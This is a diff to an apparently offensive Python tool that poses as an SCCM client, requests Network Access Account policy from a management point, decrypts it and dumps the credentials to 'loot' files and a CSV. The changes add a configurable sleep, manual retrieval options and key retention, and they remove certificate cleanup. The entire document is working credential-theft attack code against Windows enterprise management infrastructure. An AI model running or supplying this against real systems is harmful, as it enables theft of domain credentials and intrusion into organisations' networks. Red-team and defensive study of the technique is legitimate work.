@@ -16,7 +16,7 @@ from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes, ciphers
+from cryptography.hazmat.primitives import hashes, ciphers, serialization
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography import x509
 from cryptography.x509.oid import NameOID
@@ -56,16 +56,6 @@ class Tools:
       fd.write(input)
   
   @staticmethod
-  def print_table(logs_dir):
-    try:
-        df = pd.read_csv(f"{logs_dir}/csvs/naa_creds.csv").fillna("None")
-        if df.any:
-            logger.info("[*] Showing NAA creds")
-        logger.info(tabulate(df, headers = 'keys', tablefmt = 'grid'))
-    except:
-            logger.info(f"[-] NAA creds csv not found.")
-
-  @staticmethod
   def write_to_csv(input, logs_dir):
       fields = ["username", "password"]
       file = f"{logs_dir}/csvs/naa_creds.csv"
@@ -74,7 +64,7 @@ class Tools:
             writer.writeheader()
             writer.writerows(input)
       logger.info(f"[+] NAA credentials saved to {file}")
-      #Tools.print_table(logs_dir=logs_dir)  
+
 
 
 class CryptoTools:
@@ -150,21 +140,26 @@ class CryptoTools:
 
 class SCCMTools():
 
-    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password, logs_dir):
+    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password, sleep, logs_dir):
         self._server = target_sccm
         self._serverURI = f"http://{self._server}"
         self._target_name = target_name
         self._target_fqdn = target_fqdn
         self.target_username = target_username
         self.target_password = target_password
+        self.sleep = sleep
         self.logs_dir = logs_dir
 
-    def sendCCMPostRequest(self, data, auth=False, username="", password=""):
+    def sendCCMPostRequest(self, data, auth=False, username="", password="", mp = ""):
         headers = {
             "Connection": "close",
             "User-Agent": "ConfigMgr Messaging HTTP Sender",
             "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
         }
+
+        #for manual retrieval
+        if mp:
+            self._serverURI = mp
 
         if auth:
           r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
@@ -176,7 +171,7 @@ class SCCMTools():
             if part.headers[b'content-type'] == b'application/octet-stream':
                 return zlib.decompress(part.content).decode('utf-16')
 
-    def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False):
+    def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False, key=""):
         headers = {
             "Connection": "close",
             "User-Agent": "ConfigMgr Messaging HTTP Sender"
@@ -187,7 +182,12 @@ class SCCMTools():
             clientID, 
             now.strftime(dateFormat1)
           )
+          #for manual retrieval
+          if key:
+              self.key = key
           headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
+
+
 
         r = requests.get(f"{self._serverURI}"+url, headers=headers)
         if retcontent == True:
@@ -198,6 +198,7 @@ class SCCMTools():
     def createCertificate(self, writeToTmp=False):
         self.key = CryptoTools.generateRSAKey()
         self.cert = CryptoTools.createCertificateForKey(self.key, u"ConfigMgr Client")
+
 
         if writeToTmp:
             #with open("/tmp/key.pem", "wb") as f:
@@ -264,6 +265,10 @@ class SCCMTools():
 
         data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')
 
+        with open (f"{self.logs_dir}/{uuid}.data", "wb") as f:
+            f.write(data)
+
+ 
         deflatedData = self.sendCCMPostRequest(data)
         result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
         #r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
@@ -281,10 +286,13 @@ class SCCMTools():
         policy = decrypted.decode('utf-16')
         return policy
     
-    def cleanupCertificate(self, remove):
-       if remove:
-          os.remove("certificate.pem")
-          os.remove("key.pem")
+    def rename_key(self, uuid):
+       key = f"{os.getcwd()}/key.pem"
+               # with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
+        #     key = g.read()
+       newkey = f"{self.logs_dir}/{uuid}.pem"
+       if uuid:
+          os.rename(key, newkey)
 
 
 #### Huge shoutout to @SkelSec for this code
@@ -379,14 +387,17 @@ class SCCMTools():
         logger.debug("[*] Registering our fake server...")
         uuid = self.sendRegistration(self._target_name, self._target_fqdn, self.target_username, self.target_password)
 
+        self.rename_key(uuid)
         logger.debug(f"[*] Done.. our ID is {uuid}")
 
+
+
         # If too quick, SCCM requests fail (DB error, jank!)
-        logger.info(f"[*] Waiting 20 seconds for database to update.")
-        time.sleep(20)
+        logger.info(f"[*] Waiting {self.sleep} seconds for database to update.")
+        time.sleep(self.sleep)
 
         logger.debug("[*] Requesting NAAPolicy.. 2 secs")
-        print(self._target_name, self._target_fqdn, uuid, self._target_name, self._target_fqdn, uuid)
+
         urls = self.sendPolicyRequest(self._target_name, self._target_fqdn, uuid, self._target_name, self._target_fqdn, uuid)
 
         logger.debug("[*] Parsing for Secretz...")
@@ -403,15 +414,12 @@ class SCCMTools():
                     Tools.write_to_file(decryptedResult, file_name)
                     policies.append(file_name)
                     logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
-                    self.cleanupCertificate(True)
+                    #self.cleanupCertificate(True)
                     return True
                 except:
                     logger.info(f"[-] Something went wrong.")
-        self.cleanupCertificate(True)
+        #self.cleanupCertificate(True)
         return False
                 
         
  
-
-
-
